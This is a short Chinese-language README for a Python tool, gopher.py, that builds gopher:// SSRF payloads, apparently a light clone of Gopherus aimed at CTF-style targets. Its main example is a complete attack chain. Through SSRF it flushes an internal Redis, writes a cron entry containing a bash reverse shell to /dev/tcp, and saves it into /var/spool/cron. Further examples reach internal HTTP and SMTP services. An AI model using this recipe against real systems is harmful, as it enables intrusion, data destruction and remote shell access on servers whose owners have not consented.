# gopher 使用说明

> 参考: [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)(轻量实现)

## 依赖

```
无(纯标准库)
```

## 命令

```bash
python gopher.py --selftest       # 自测

# 打内网 Redis(写 crontab 反弹 shell 为例)
python gopher.py --type redis --host 127.0.0.1 --port 6379 \
  --cmd "flushall" \
  --cmd "set x \"\n\n*/1 * * * * bash -i >& /dev/tcp/ip/port 0>&1\n\n\"" \
  --cmd "config set dir /var/spool/cron/" \
  --cmd "config set dbfilename crontab" \
  --cmd "save"

# 打内网 HTTP
python gopher.py --type http --host 127.0.0.1 --port 8080 --path /flag.php

# 任意原始报文(--data 支持 0x hex)
python gopher.py --type raw --host 127.0.0.1 --port 25 --data "HELO x"
```

## 参数

| 参数 | 说明 |
|------|------|
| `--type redis|http|raw` | payload 类型 |
| `--cmd`(可多次) | redis 命令, 自动转 RESP 协议 |
| `--path/--method` | http 请求行 |
| `--no-double` | 只做一次 URL 编码(默认二次编码) |

## 输出

第一行为原始报文, 空行后为 `gopher://host:port/_<编码payload>`; 编码选择:
URL 参数里传 → 二次编码(默认); 直接请求 → `--no-double` 单次。
